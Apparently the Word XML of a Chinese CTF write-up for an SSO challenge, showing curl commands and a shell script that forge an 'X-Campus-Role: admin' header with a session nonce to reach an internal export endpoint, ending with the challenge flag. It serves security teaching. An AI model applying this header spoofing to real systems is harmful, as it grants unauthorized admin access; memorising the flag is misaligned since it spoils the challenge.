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Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
          <w:b/>
          <w:color w:val="0B2545"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>单点登录的信任裂缝题解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一、题目考点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本题主要考查 Web 场景中的身份代理头信任问题。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核心考点如下：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b/>
        </w:rPr>
        <w:t>Cookie Session 复用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 xml:space="preserve">登录后服务端会下发 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>support_sid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t>，后续访问个人支持页和内部导出接口时都需要保持同一个 Cookie Session。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b/>
        </w:rPr>
        <w:t>页面信息收集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普通用户登录后，个人支持页会泄露关键调试信息，包括：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后端接收身份头：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>X-Campus-Role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内部导出接口：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/internal/export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当前会话导出 nonce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b/>
        </w:rPr>
        <w:t>客户端可控请求头导致的权限绕过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 xml:space="preserve">后端错误信任了客户端传入的代理身份头 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>X-Campus-Role</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t>。攻击者可以在请求中手动添加：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 xml:space="preserve">   X-Campus-Role: admin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从而把普通用户会话伪装成管理员代理身份。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b/>
        </w:rPr>
        <w:t>nonce 校验绕过条件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内部导出接口需要携带当前会话对应的 nonce，请求头为：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 xml:space="preserve">   X-Export-Nonce: &lt;当前会话 nonce&gt;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 xml:space="preserve">只要保持同一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>support_sid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t xml:space="preserve">，并使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/profile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t xml:space="preserve"> 页面显示的 nonce，即可通过校验。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二、解题思路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首先访问题目环境首页：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curl -i http://web-f0187bda68.adworld.xctf.org.cn/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页面中给出普通支持账号：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student2025 / practice-only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然后使用该账号登录，并保存服务端返回的 Cookie：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curl -i -c /tmp/ctf_sso_cookies.txt \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 xml:space="preserve">  -d 'username=student2025&amp;password=practice-only' \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/login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 xml:space="preserve">登录成功后，服务端返回 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>support_sid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t>，后续请求都需要使用该 Cookie。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接着访问个人支持页：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curl -i -b /tmp/ctf_sso_cookies.txt \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/profile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页面中可以看到类似信息：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代理链调试提示：后端接收身份头 &lt;code&gt;X-Campus-Role&lt;/code&gt;。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内部导出接口：&lt;code&gt;/internal/export&lt;/code&gt;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管理链路备注：该导出接口仅接受 &lt;code&gt;admin&lt;/code&gt; 代理身份。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本会话导出 nonce：&lt;code&gt;17QVHJE9A5ocg0WdyHQCojGd&lt;/code&gt;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由此可知，内部导出接口需要满足三个条件：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 xml:space="preserve">使用已登录的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>support_sid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请求头中携带当前会话 nonce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 xml:space="preserve">请求头中身份为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>admin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 xml:space="preserve">由于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>X-Campus-Role</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是客户端可控的请求头，因此可以直接伪造为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t>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curl -i -b /tmp/ctf_sso_cookies.txt \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 xml:space="preserve">  -H 'X-Campus-Role: admin' \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 xml:space="preserve">  -H 'X-Export-Nonce: 17QVHJE9A5ocg0WdyHQCojGd' \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/internal/export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 xml:space="preserve">需要注意的是，nonce 与当前会话相关，每次重新登录后可能变化，应以当前 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/profile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t xml:space="preserve"> 页面显示的值为准。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>也可以用下面的流程自动完成登录、提取 nonce 和导出：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tmp_cookie=/tmp/ctf_sso_cookies_rerun.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -i -sS -c "$tmp_cookie" \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 xml:space="preserve">  -d 'username=student2025&amp;password=practice-only' \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>profile=$(curl -sS -b "$tmp_cookie" \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/profile)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nonce=$(printf '%s' "$profile" \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 xml:space="preserve">  | sed -n 's/.*本会话导出 nonce：&lt;code&gt;\([^&lt;]*\)&lt;\/code&gt;.*/\1/p')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -i -sS -b "$tmp_cookie" \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 xml:space="preserve">  -H 'X-Campus-Role: admin' \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 xml:space="preserve">  -H "X-Export-Nonce: $nonce" \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 xml:space="preserve">  http://web-f0187bda68.adworld.xctf.org.cn/internal/export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</w:rPr>
        <w:t xml:space="preserve">接口返回内容中包含 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:eastAsia="Arial Unicode MS" w:cs="Arial Unicode MS"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段，说明导出成功。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三、最终输出的 Flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CTFCodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>flag{qVWsUZD7vaN07FKuYaEA6RIUqjDGIto5}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666666"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>单点登录的信任裂缝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 w:cs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B25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FCodeBlock">
    <w:name w:val="CTF Code Block"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="120" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="259" w:right="115"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Menlo" w:hAnsi="Menlo" w:eastAsia="Menlo" w:cs="Menlo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